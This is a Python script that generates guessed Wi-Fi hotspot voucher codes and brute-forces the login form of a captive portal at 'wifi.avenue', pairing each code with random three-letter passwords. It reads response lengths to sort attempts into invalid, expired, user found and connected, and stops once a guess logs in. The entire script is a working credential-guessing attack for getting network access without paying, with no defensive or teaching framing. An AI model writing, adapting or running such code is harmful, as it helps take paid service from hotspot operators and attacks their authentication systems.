import rstr
import requests
import random
import string

_type = input('1.) Generate Vouchers <3\n2.) Check vouchers.txt (RDM Password) <$\n3.) Generate & Check ./.\nOption selected: ')
if _type=="1":
    user = input("How many vouchers to generate?: ")
    df=open('vouchers.txt', 'w')
    for i in range(int(user)):
        hours = [5, 10, 20, 50, 100]
        code = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
        df.write(rstr.xeger(str(random.choice(hours)) + 'f'+code))
        df.write('\n')
        print("[" + str(i) + '] ' + str(random.choice(hours)) + 'f'+code)
elif _type=="2":
    url = 'http://wifi.avenue'
    cSession = requests.Session()
    cSession.get(url)
    with open('vouchers.txt') as f:
        for line in f:
            passagay = rstr.xeger('[a-z][a-z][a-z]')
            data = {
                "username": str(line), # algo hf#qwe or hfqwe#
                "password": str(passagay),
                "dst":"http://www.google.com/",
                "popup":"true"
            }
            res = cSession.post("http://wifi.avenue/login", data=data)
            print(len(line), len(passagay))
            if len(res.text) == 15036:
                print('[Invalid] Failed | ' + line + ':' + passagay)
            elif len(res.text) == 15002:
                print('[Voucher Expired] Failed | ' + line + ':' + passagay)
            elif len(res.text) == 14990:
                print('[User Found] Success | ' + line + ':' + passagay)
            elif len(res.text) == 1381:
                print('You are now connected... | ' + line + ':' + passagay)
                print('You are now connected... | ' + line + ':' + passagay)
                print('You are now connected... | ' + line + ':' + passagay)
                print('You are now connected... | ' + line + ':' + passagay)
                print('You are now connected... | ' + line + ':' + passagay)
                print('You are now connected... | ' + line + ':' + passagay)
                print('You are now connected... | ' + line + ':' + passagay)
                print('You are now connected... | ' + line + ':' + passagay)
                print('You are now connected... | ' + line + ':' + passagay)
                print('You are now connected... | ' + line + ':' + passagay)
                break
            elif 'str' in line:
                print('Voucher has been checked, basta malas. HAHAHAHAHA')
                break
elif _type=="3":
    url = 'http://wifi.avenue'
    cSession = requests.Session()
    cSession.get(url)
    total = input('Please enter how many vouchers you want: ')
    for x in range(int(total)):
        hours = [5, 10, 20, 50, 100]
        code = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
        voucher = rstr.xeger(str(random.choice(hours)) + 'f'+code)
        passagay = rstr.xeger('[a-z][a-z][a-z]')
        data = {
            "username": voucher, # algo hf#qwe or hfqwe#
            "password": passagay,
            "dst":"http://www.google.com/",
            "popup":"true"
        }
        res = cSession.post("http://wifi.avenue/login", data=data)
        resLength = len(res.text)
        if resLength >= 15028:
            print('[Invalid: ' + str(len(res.text)) + '] Failed | ' + voucher + ':' + passagay)
        elif resLength == 15002:
            print('[Expired: ' + str(len(res.text)) + '] Failed | ' + voucher + ':' + passagay)
        elif resLength == 14990:
            print('[User Found: ' + str(len(res.text)) + '] Success | ' + voucher + ':' + passagay)
        elif resLength == 1381:
            print('You are now connected... | ' + voucher + ':' + passagay)
            print('You are now connected... | ' + voucher + ':' + passagay)
            print('You are now connected... | ' + voucher + ':' + passagay)
            print('You are now connected... | ' + voucher + ':' + passagay)
            print('You are now connected... | ' + voucher + ':' + passagay)
            break
        else:
            print('[Unknown Res: ' + str(len(res.text)) + '] Failed...')
            print(res.text)
            
else:
    print('error, bagohan pa sa python...')